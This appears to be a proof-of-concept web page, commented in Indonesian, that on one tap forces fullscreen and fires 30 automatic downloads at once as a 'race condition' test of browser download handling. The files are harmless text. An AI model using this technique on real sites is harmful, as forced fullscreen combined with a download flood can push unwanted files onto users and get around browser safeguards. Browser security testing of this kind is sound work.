<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Auto Fullscreen & Race Multi-Download (30 Files)</title>

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: Arial, sans-serif;
      background: #f4f6f8;
      color: #222;
      padding: 20px;
    }
    .panel {
      background: #fff;
      padding: 24px;
      border-radius: 12px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
      max-width: 650px;
      margin: 40px auto;
    }
    /* Memastikan tampilan penuh saat masuk mode fullscreen di Android */
    :fullscreen {
      background: #ffffff !important;
      padding: 20px !important;
      overflow-y: auto !important;
      width: 100vw !important;
      height: 100vh !important;
    }
    :-webkit-full-screen {
      background: #ffffff !important;
      padding: 20px !important;
      overflow-y: auto !important;
    }
    button {
      width: 100%;
      padding: 16px;
      cursor: pointer;
      border: 0;
      border-radius: 6px;
      background: #007bff;
      color: #fff;
      font-weight: bold;
      font-size: 16px;
      -webkit-tap-highlight-color: transparent;
    }
    #status { 
      margin-top: 16px; 
      font-weight: bold; 
      color: #1565c0; 
      padding: 10px;
      background: #e3f2fd;
      border-radius: 4px;
      display: inline-block;
      width: 100%;
      text-align: center;
    }
    #downloads {
      margin-top: 20px;
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
      gap: 10px;
    }
    #downloads a { 
      display: block; 
      padding: 8px;
      background: #e8f5e9;
      color: #2e7d32;
      text-decoration: none;
      border-radius: 4px;
      font-size: 13px;
      text-align: center;
      border: 1px solid #c8e6c9;
    }
  </style>
</head>

<body>
  <div class="panel" id="main-panel">
    <h2>Mobile Auto-Fullscreen & 30 Files Download</h2>
    <p style="margin-bottom: 15px;">Ketuk tombol di bawah. Halaman akan otomatis masuk layar penuh pada Android dan menembak 30 file secara race condition.</p>

    <p>
      <button id="start" type="button">Masuk Fullscreen & Unduh 30 File</button>
    </p>

    <p id="status" role="status">Siap menjalankan pengujian.</p>
    <div id="downloads"></div>
  </div>

  <script>
    const start = document.getElementById("start");
    const status = document.getElementById("status");
    const downloads = document.getElementById("downloads");

    let objectUrls = [];

    // Fungsi Asinkronus untuk mempersiapkan Blob di Microtask Queue (Race Condition Preparation)
    const prepareBlobAsync = (i) => {
      return new Promise((resolve) => {
        // Menggunakan queueMicrotask agar kalkulasi teks/blob berjalan secara paralel sebelum masuk ke antrean download DOM
        queueMicrotask(() => {
          const content = `PoC file ${i}\nPengujian dengan metode pemisahan antrean paralel rawan race condition.\n`;
          const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
          const url = URL.createObjectURL(blob);
          resolve({ id: i, url: url });
        });
      });
    };

    // Memicu download secara instan menggunakan Event Loop Macrotask
    const triggerInstantDownload = (fileData) => {
      setTimeout(() => {
        const link = document.createElement("a");
        link.href = fileData.url;
        link.download = `poc-race-${String(fileData.id).padStart(2, '0')}.txt`;
        link.textContent = `File ${fileData.id}`;
        downloads.appendChild(link);

        link.click();
      }, 0);
    };

    start.addEventListener("click", () => {
      // PEMBERSIHAN AWAL (Instan)
      objectUrls.forEach(url => URL.revokeObjectURL(url));
      objectUrls = [];
      downloads.replaceChildren();

      // 1. EKSEKUSI FULLSCREEN INSTAN (Prioritas Utama pada klik pertama)
      const docEl = document.documentElement;
      try {
        if (docEl.requestFullscreen) {
          docEl.requestFullscreen();
        } else if (docEl.webkitRequestFullscreen) { 
          docEl.webkitRequestFullscreen();
        } else if (docEl.mozRequestFullScreen) { 
          docEl.mozRequestFullScreen();
        }
        status.textContent = "Auto Fullscreen Berhasil dipicu!";
      } catch (err) {
        console.warn(`Gagal masuk fullscreen: ${err.message}`);
      }

      // 2. SKENARIO RACE CONDITION ASINKRONUS
      // Menggunakan jeda 100ms agar animasi transisi fullscreen selesai tanpa patah-patah
      setTimeout(async () => {
        status.textContent = "Layar penuh aktif. Menyiapkan data secara paralel...";

        // Membuat 30 promise sekaligus untuk balapan di Microtask Queue
        const downloadPromises = [];
        for (let i = 1; i <= 30; i++) {
          downloadPromises.push(prepareBlobAsync(i));
        }

        // Menunggu seluruh Blob siap secara bersamaan (Simultaneous Race)
        const allFiles = await Promise.all(downloadPromises);
        
        status.textContent = "Mengeksekusi pemboman 30 file ke browser...";
        
        // Menembakkan unduhan masal secara asinkronus tercepat
        allFiles.forEach(fileData => {
          objectUrls.push(fileData.url);
          triggerInstantDownload(fileData);
        });
      }, 100); 
    });
  </script>
</body>
</html>
